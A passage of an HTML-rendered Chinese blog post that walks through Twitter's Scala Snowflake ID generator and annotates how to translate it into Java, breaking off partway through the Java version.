class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Copyright 2010-2012 Twitter, Inc.*/</span></span><br><span class="line"><span class="keyword">package</span> com.twitter.service.snowflake</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.twitter.ostrich.stats.<span class="type">Stats</span></span><br><span class="line"><span class="keyword">import</span> com.twitter.service.snowflake.gen._</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="type">Random</span></span><br><span class="line"><span class="keyword">import</span> com.twitter.logging.<span class="type">Logger</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * An object that generates IDs.</span></span><br><span class="line"><span class="comment"> * This is broken into a separate class in case</span></span><br><span class="line"><span class="comment"> * we ever want to support multiple worker threads</span></span><br><span class="line"><span class="comment"> * per process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IdWorker</span>(<span class="params"></span></span></span><br><span class="line"><span class="class"><span class="params">    val workerId: <span class="type">Long</span>, </span></span></span><br><span class="line"><span class="class"><span class="params">    val datacenterId: <span class="type">Long</span>, </span></span></span><br><span class="line"><span class="class"><span class="params">    private val reporter: <span class="type">Reporter</span>, </span></span></span><br><span class="line"><span class="class"><span class="params">    var sequence: <span class="type">Long</span> = 0L</span>) <span class="keyword">extends</span> <span class="title">Snowflake</span>.<span class="title">Iface</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">genCounter</span></span>(agent: <span class="type">String</span>) = &#123;</span><br><span class="line">    <span class="type">Stats</span>.incr(<span class="string">"ids_generated"</span>)</span><br><span class="line">    <span class="type">Stats</span>.incr(<span class="string">"ids_generated_%s"</span>.format(agent))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> exceptionCounter = <span class="type">Stats</span>.getCounter(<span class="string">"exceptions"</span>)</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> log = <span class="type">Logger</span>.get</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> rand = <span class="keyword">new</span> <span class="type">Random</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">val</span> twepoch = <span class="number">1288834974657</span>L</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> workerIdBits = <span class="number">5</span>L</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> datacenterIdBits = <span class="number">5</span>L</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> maxWorkerId = <span class="number">-1</span>L ^ (<span class="number">-1</span>L &lt;&lt; workerIdBits)</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> maxDatacenterId = <span class="number">-1</span>L ^ (<span class="number">-1</span>L &lt;&lt; datacenterIdBits)</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> sequenceBits = <span class="number">12</span>L</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> workerIdShift = sequenceBits</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> datacenterIdShift = sequenceBits + workerIdBits</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> sequenceMask = <span class="number">-1</span>L ^ (<span class="number">-1</span>L &lt;&lt; sequenceBits)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> lastTimestamp = <span class="number">-1</span>L</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check for workerId</span></span><br><span class="line">  <span class="keyword">if</span> (workerId &gt; maxWorkerId || workerId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    exceptionCounter.incr(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">IllegalArgumentException</span>(<span class="string">"worker Id can't be greater than %d or less than 0"</span>.format(maxWorkerId))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (datacenterId &gt; maxDatacenterId || datacenterId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    exceptionCounter.incr(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">IllegalArgumentException</span>(<span class="string">"datacenter Id can't be greater than %d or less than 0"</span>.format(maxDatacenterId))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"worker starting. timestamp left shift %d, datacenter id bits %d, worker id bits %d, sequence bits %d, workerid %d"</span>,</span><br><span class="line">    timestampLeftShift, datacenterIdBits, workerIdBits, sequenceBits, workerId)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_id</span></span>(useragent: <span class="type">String</span>): <span class="type">Long</span> = &#123;</span><br><span class="line">    <span class="keyword">if</span> (!validUseragent(useragent)) &#123;</span><br><span class="line">      exceptionCounter.incr(<span class="number">1</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">InvalidUserAgentError</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> id = nextId()</span><br><span class="line">    genCounter(useragent)</span><br><span class="line"></span><br><span class="line">    reporter.report(<span class="keyword">new</span> <span class="type">AuditLogEntry</span>(id, useragent, rand.nextLong))</span><br><span class="line">    id</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_worker_id</span></span>(): <span class="type">Long</span> = workerId</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_datacenter_id</span></span>(): <span class="type">Long</span> = datacenterId</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_timestamp</span></span>() = <span class="type">System</span>.currentTimeMillis</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span>[snowflake] <span class="function"><span class="keyword">def</span> <span class="title">nextId</span></span>(): <span class="type">Long</span> = synchronized &#123;</span><br><span class="line">    <span class="keyword">var</span> timestamp = timeGen()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timestamp &lt; lastTimestamp) &#123;</span><br><span class="line">      exceptionCounter.incr(<span class="number">1</span>)</span><br><span class="line">      log.error(<span class="string">"clock is moving backwards.  Rejecting requests until %d."</span>, lastTimestamp);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">InvalidSystemClock</span>(<span class="string">"Clock moved backwards.  Refusing to generate id for %d milliseconds"</span>.format(</span><br><span class="line">        lastTimestamp - timestamp))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastTimestamp == timestamp) &#123;</span><br><span class="line">      sequence = (sequence + <span class="number">1</span>) &amp; sequenceMask</span><br><span class="line">      <span class="keyword">if</span> (sequence == <span class="number">0</span>) &#123;</span><br><span class="line">        timestamp = tilNextMillis(lastTimestamp)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      sequence = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastTimestamp = timestamp</span><br><span class="line">    ((timestamp - twepoch) &lt;&lt; timestampLeftShift) |</span><br><span class="line">      (datacenterId &lt;&lt; datacenterIdShift) |</span><br><span class="line">      (workerId &lt;&lt; workerIdShift) | </span><br><span class="line">      sequence</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">def</span> <span class="title">tilNextMillis</span></span>(lastTimestamp: <span class="type">Long</span>): <span class="type">Long</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> timestamp = timeGen()</span><br><span class="line">    <span class="keyword">while</span> (timestamp &lt;= lastTimestamp) &#123;</span><br><span class="line">      timestamp = timeGen()</span><br><span class="line">    &#125;</span><br><span class="line">    timestamp</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">def</span> <span class="title">timeGen</span></span>(): <span class="type">Long</span> = <span class="type">System</span>.currentTimeMillis()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">val</span> <span class="type">AgentParser</span> = <span class="string">""</span><span class="string">"([a-zA-Z][a-zA-Z\-0-9]*)"</span><span class="string">""</span>.r</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">validUseragent</span></span>(useragent: <span class="type">String</span>): <span class="type">Boolean</span> = useragent <span class="keyword">match</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="type">AgentParser</span>(_) =&gt; <span class="literal">true</span></span><br><span class="line">    <span class="keyword">case</span> _ =&gt; <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Scala 是一门可以编译成字节码的语言，简单理解是在 Java 语法基础上加上了很多语法糖，例如不用每条语句后写分号，可以使用动态类型等等。抱着试一试的心态，我把 Scala 版的代码“翻译”成 Java 版本的，对 scala 代码改动的地方如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Copyright 2010-2012 Twitter, Inc.*/</span></span><br><span class="line"><span class="keyword">package</span> com.twitter.service.snowflake</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.twitter.ostrich.stats.Stats </span><br><span class="line"><span class="keyword">import</span> com.twitter.service.snowflake.gen._</span><br><span class="line"><span class="keyword">import</span> java.util.Random</span><br><span class="line"><span class="keyword">import</span> com.twitter.logging.Logger</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * An object that generates IDs.</span></span><br><span class="line"><span class="comment"> * This is broken into a separate class in case</span></span><br><span class="line"><span class="comment"> * we ever want to support multiple worker threads</span></span><br><span class="line"><span class="comment"> * per process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IdWorker</span>(                                        // |</span></span><br><span class="line">    val workerId: Long,                                // |</span><br><span class="line">    val datacenterId: Long,                            <span class="comment">// |&lt;--这部分改成Java的构造函数形式</span></span><br><span class="line">    <span class="keyword">private</span> val reporter: Reporter,<span class="comment">//日志相关，删       // |</span></span><br><span class="line">    <span class="keyword">var</span> sequence: Long = <span class="number">0L</span>)                           <span class="comment">// |</span></span><br><span class="line">       extends Snowflake.Iface &#123; <span class="comment">//接口找不到，删       // |     </span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function">def <span class="title">genCounter</span><span class="params">(agent: String)</span> </span>= &#123;                     <span class="comment">// |</span></span><br><span class="line">    Stats.incr(<span class="string">"ids_generated"</span>)                                       <span class="comment">// |</span></span><br><span class="line">    Stats.incr(<span class="string">"ids_generated_%s"</span>.format(agent))                      <span class="comment">// |&lt;--错误、日志处理相关，删</span></span><br><span class="line">  &#125;                                                                   <span class="comment">// | </span></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val exceptionCounter = Stats.getCounter(<span class="string">"exceptions"</span>) <span class="comment">// |</span></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val log = Logger.get                                  <span class="comment">// |</span></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val rand = <span class="keyword">new</span> Random                                 <span class="comment">// | </span></span><br><span class="line"></span><br><span class="line">  val twepoch = <span class="number">1288834974657L</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val workerIdBits = <span class="number">5L</span></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val datacenterIdBits = <span class="number">5L</span></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val maxWorkerId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; workerIdBits)</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val maxDatacenterId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; datacenterIdBits)</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val sequenceBits = <span class="number">12L</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val workerIdShift = sequenceBits</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val datacenterIdShift = sequenceBits + workerIdBits</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] val sequenceMask = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; sequenceBits)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> lastTimestamp = -<span class="number">1L</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//----------------------------------------------------------------------------------------------------------------------------//</span></span><br><span class="line">  <span class="comment">// sanity check for workerId                                                                                                  //</span></span><br><span class="line">  <span class="keyword">if</span> (workerId &gt; maxWorkerId || workerId &lt; <span class="number">0</span>) &#123;                                                                                 <span class="comment">//</span></span><br><span class="line">    exceptionCounter.incr(<span class="number">1</span>) <span class="comment">//&lt;--错误处理相关，删                                                                               //</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"worker Id can't be greater than %d or less than 0"</span>.format(maxWorkerId))                 <span class="comment">//这</span></span><br><span class="line">    <span class="comment">// |--&gt;改成：throw new IllegalArgumentException                                                                              //部</span></span><br><span class="line">    <span class="comment">//            (String.format("worker Id can't be greater than %d or less than 0",maxWorkerId))                              //分</span></span><br><span class="line">  &#125;                                                                                                                             <span class="comment">//放</span></span><br><span class="line">                                                                                                                                <span class="comment">//到</span></span><br><span class="line">  <span class="keyword">if</span> (datacenterId &gt; maxDatacenterId || datacenterId &lt; <span class="number">0</span>) &#123;                                                                     <span class="comment">//构</span></span><br><span class="line">    exceptionCounter.incr(<span class="number">1</span>) <span class="comment">//&lt;--错误处理相关，删                                                                               //造</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"datacenter Id can't be greater than %d or less than 0"</span>.format(maxDatacenterId))         <span class="comment">//函</span></span><br><span class="line">    <span class="comment">// |--&gt;改成：throw new IllegalArgumentException                                                                             //数</span></span><br><span class="line">    <span class="comment">//             (String.format("datacenter Id can't be greater than %d or less than 0",maxDatacenterId))                     //中</span></span><br><span class="line">  &#125;                                                                                                                             <span class="comment">//</span></span><br><span class="line">                                                                                                                                <span class="comment">//</span></span><br><span class="line">  log.info(<span class="string">"worker starting. timestamp left shift %d, datacenter id bits %d, worker id bits %d, sequence bits %d, workerid %d"</span>, <span class="comment">//  </span></span><br><span class="line">    timestampLeftShift, datacenterIdBits, workerIdBits, sequenceBits, workerId)                                                 <span class="comment">//   </span></span><br><span class="line">  <span class="comment">// |--&gt;改成：System.out.printf("worker...%d...",timestampLeftShift,...);                                                      //</span></span><br><span class="line">  <span class="comment">//----------------------------------------------------------------------------------------------------------------------------//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//-------------------------------------------------------------------//  </span></span><br><span class="line">  <span class="comment">//这个函数删除错误处理相关的代码后，剩下一行代码：val id = nextId()      //</span></span><br><span class="line">  <span class="comment">//所以我们直接调用nextId()函数可以了，所以在“翻译”时可以删除这个函数      //</span></span><br><span class="line">  <span class="function">def <span class="title">get_id</span><span class="params">(useragent: String)</span>: Long </span>= &#123;                              <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (!validUseragent(useragent)) &#123;                                  <span class="comment">//</span></span><br><span class="line">      exceptionCounter.incr(<span class="number">1</span>)                                         <span class="comment">//</span></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> InvalidUserAgentError                                  <span class="comment">//删</span></span><br><span class="line">    &#125;                                                                  <span class="comment">//除</span></span><br><span class="line">                                                                       <span class="comment">// </span></span><br><span class="line">    val id = nextId()                                                  <span class="comment">// </span></span><br><span class="line">    genCounter(useragent)                                              <span class="comment">//</span></span><br><span class="line">                                                                       <span class="comment">//</span></span><br><span class="line">    reporter.report(<span class="keyword">new</span> AuditLogEntry(id, useragent, rand.nextLong))   <span class="comment">//</span></span><br><span class="line">    id                                                                 <span class="comment">//</span></span><br><span class="line">  &#125;                                                                    <span class="comment">// </span></span><br><span class="line">  <span class="comment">//-------------------------------------------------------------------//</span></span><br><span class="line"></span><br><span class="line">  <span class="function">def <span class="title">get_worker_id</span><span class="params">()</span>: Long </span>= workerId           <span class="comment">// |</span></span><br><span class="line">  <span class="function">def <span class="title">get_datacenter_id</span><span class="params">()</span>: Long </span>= datacenterId   <span class="comment">// |&lt;--改成Java函数</span></span><br><span class="line">  <span class="function">def <span class="title">get_timestamp</span><span class="params">()</span> </span>= System.currentTimeMillis <span class="comment">// |</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span>[snowflake] <span class="function">def <span class="title">nextId</span><span class="params">()</span>: Long </span>= <span class="keyword">synchronized</span> &#123; <span class="comment">// 改成Java函数</span></span><br><span class="line">    <span class="keyword">var</span> timestamp = timeGen()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timestamp &lt; lastTimestamp) &#123;</span><br><span class="line">      exceptionCounter.incr(<span class="number">1</span>) <span class="comment">// 错误处理相关，删</span></span><br><span class="line">      log.error(<span class="string">"clock is moving backwards.  Rejecting requests until %d."</span>, lastTimestamp); <span class="comment">// 改成System.err.printf(...)</span></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> InvalidSystemClock(<span class="string">"Clock moved backwards.  Refusing to generate id for %d milliseconds"</span>.format(</span><br><span class="line">        lastTimestamp - timestamp)) <span class="comment">// 改成RumTimeException</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastTimestamp == timestamp) &#123;</span><br><span class="line">      sequence = (sequence + <span class="number">1</span>) &amp; sequenceMask</span><br><span class="line">      <span class="keyword">if</span> (sequence == <span class="number">0</span>) &#123;</span><br><span class="line">        timestamp = tilNextMillis(lastTimestamp)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      sequence = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastTimestamp = timestamp</span><br><span class="line">    ((timestamp - twepoch) &lt;&lt; timestampLeftShift) | <span class="comment">// |&lt;--加上关键字return</span></span><br><span class="line">      (datacenterId &lt;&lt; datacenterIdShift) |         <span class="comment">// |</span></span><br><span class="line">      (workerId &lt;&lt; workerIdShift) |                 <span class="comment">// |</span></span><br><span class="line">      sequence                                      <span class="comment">// |</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> def <span class="title">tilNextMillis</span><span class="params">(lastTimestamp: Long)</span>: Long </span>= &#123; <span class="comment">// 改成Java函数</span></span><br><span class="line">    <span class="keyword">var</span> timestamp = timeGen()</span><br><span class="line">    <span class="keyword">while</span> (timestamp &lt;= lastTimestamp) &#123;</span><br><span class="line">      timestamp = timeGen()</span><br><span class="line">    &#125;</span><br><span class="line">    timestamp <span class="comment">// 加上关键字return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> def <span class="title">timeGen</span><span class="params">()</span>: Long </span>= System.currentTimeMillis() <span class="comment">// 改成Java函数</span></span><br><span class="line"></span><br><span class="line">  val AgentParser = <span class="string">""</span><span class="string">"([a-zA-Z][a-zA-Z\-0-9]*)"</span><span class="string">""</span>.r                  <span class="comment">// |</span></span><br><span class="line">                                                                      <span class="comment">// | </span></span><br><span class="line">  <span class="function">def <span class="title">validUseragent</span><span class="params">(useragent: String)</span>: Boolean </span>= useragent match &#123;  <span class="comment">// |&lt;--日志相关，删</span></span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">AgentParser</span><span class="params">(_)</span> </span>=&gt; <span class="keyword">true</span>                                       <span class="comment">// |</span></span><br><span class="line">    <span class="keyword">case</span> _ =&gt; <span class="keyword">false</span>                                                   <span class="comment">// |   </span></span><br><span class="line">  &#125;                                                                   <span class="comment">// | </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>改出来的 Java 版：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IdWorker</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> workerId;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> datacenterId;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> sequence;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IdWorker</span><span class="params">(<span class="keyword">long</span> workerId, <span class="keyword">long</span> datacenterId, <span class="keyword">long</span> sequence)</span></span>&#123;</span><br><span class="line">        <span class="comment">// sanity check for workerId</span></span><br><span class="line">        <span class="keyword">if</span> (workerId &gt; maxWorkerId || workerId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(String.format(<span class="string">"worker Id can't be greater than %d or less than 0"</span>,maxWorkerId));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (datacenterId &gt; maxDatacenterId || datacenterId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(String.format(<span class="string">"datacenter Id can't be greater than %d or less than 0"</span>,maxDatacenterId));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">"worker starting. timestamp left shift %d, datacenter id bits %d, worker id bits %d, sequence bits %d, workerid %d"</span>,</span><br><span class="line">                timestampLeftShift, datacenterIdBits, workerIdBits, sequenceBits, workerId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.workerId = workerId;</span><br><span class="line">        <span class="keyword">this</span>.datacenterId = datacenterId;</span><br><span class="line">        <span class="keyword">this</span>.sequence = sequence;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> twepoch = <span class="number">1288834974657L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> workerIdBits = <span class="number">5L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> datacenterIdBits = <span class="number">5L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> maxWorkerId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; workerIdBits);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> maxDatacenterId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; datacenterIdBits);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> sequenceBits = <span class="number">12L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> workerIdShift = sequenceBits;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> datacenterIdShift = sequenceBits + workerIdBits;</span><br><span class="line">    